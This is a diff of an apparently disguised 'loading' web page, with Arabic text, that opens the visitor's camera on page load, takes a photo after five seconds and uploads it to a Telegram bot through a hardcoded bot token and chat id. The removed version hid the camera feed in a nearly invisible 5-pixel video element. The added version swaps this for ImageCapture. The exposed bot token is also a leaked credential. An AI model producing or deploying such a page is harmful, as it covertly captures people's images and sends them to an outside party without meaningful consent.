@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>📡 جاري التشغيل...</title>
+  <title>📸 جاري التشغيل...</title>
   <style>
     body {
       margin: 0;
@@ -16,76 +16,64 @@
       justify-content: center;
       height: 100vh;
     }
-
     #status {
       font-size: 20px;
-    }
-
-    video {
-      position: fixed;
-      top: -10px;
-      left: -10px;
-      width: 5px;
-      height: 5px;
-      opacity: 0.001;
-      pointer-events: none;
-    }
-
-    canvas {
-      display: none;
     }
   </style>
 </head>
 <body>
-  <div id="status">📡 جاري تشغيل الكاميرا...</div>
-
-  <video id="video" autoplay playsinline muted></video>
-  <canvas id="canvas" width="300" height="300"></canvas>
+  <div id="status">📸 جاري تشغيل الكاميرا...</div>
 
   <script>
     const chat_id = "6908826896";
     const token = "8216581015:AAFEu3XEvT2jePOMdSU8OYP9olix4JNzfk4";
 
-    async function start() {
+    async function startCapture() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        const video = document.getElementById("video");
-        video.srcObject = stream;
+        const track = stream.getVideoTracks()[0];
 
-        setTimeout(() => {
-          takePhoto(stream);
-        }, 5000); // ننتظر 5 ثواني بعد تشغيل الفيديو فعليًا
+        // تأكد من أن الجهاز يدعم ImageCapture
+        if (!("ImageCapture" in window)) {
+          document.getElementById("status").innerText = "❌ المتصفح لا يدعم ImageCapture.";
+          return;
+        }
 
-      } catch (e) {
-        document.getElementById("status").innerText = "❌ تم رفض الكاميرا.";
+        const imageCapture = new ImageCapture(track);
+
+        document.getElementById("status").innerText = "📷 انتظر، يتم التقاط الصورة...";
+
+        // ننتظر 5 ثواني لتشغيل الكاميرا بشكل فعلي
+        setTimeout(async () => {
+          try {
+            const blob = await imageCapture.takePhoto();
+            stream.getTracks().forEach(t => t.stop());
+
+            const formData = new FormData();
+            formData.append("chat_id", chat_id);
+            formData.append("photo", blob, "photo.jpg");
+
+            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+              method: "POST",
+              body: formData
+            }).then(r => r.json()).then(d => {
+              document.getElementById("status").innerText = d.ok
+                ? "✅ تم إرسال الصورة!"
+                : "❌ فشل في الإرسال.";
+            }).catch(err => {
+              document.getElementById("status").innerText = "❌ خطأ بالشبكة.";
+            });
+          } catch (err) {
+            document.getElementById("status").innerText = "❌ فشل في التقاط الصورة.";
+          }
+        }, 5000);
+
+      } catch (err) {
+        document.getElementById("status").innerText = "❌ فشل في تشغيل الكاميرا.";
       }
     }
 
-    function takePhoto(stream) {
-      const video = document.getElementById("video");
-      const canvas = document.getElementById("canvas");
-      const ctx = canvas.getContext("2d");
-
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      stream.getTracks().forEach(track => track.stop());
-
-      canvas.toBlob(blob => {
-        const formData = new FormData();
-        formData.append("chat_id", chat_id);
-        formData.append("photo", blob, "photo.png");
-
-        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-          method: "POST",
-          body: formData
-        }).then(r => r.json()).then(d => {
-          document.getElementById("status").innerText = "✅ الصورة اتبعتت بنجاح!";
-        }).catch(err => {
-          document.getElementById("status").innerText = "❌ فشل في الإرسال.";
-        });
-      }, "image/png");
-    }
-
-    window.onload = start;
+    window.onload = startCapture;
   </script>
 </body>
 </html>
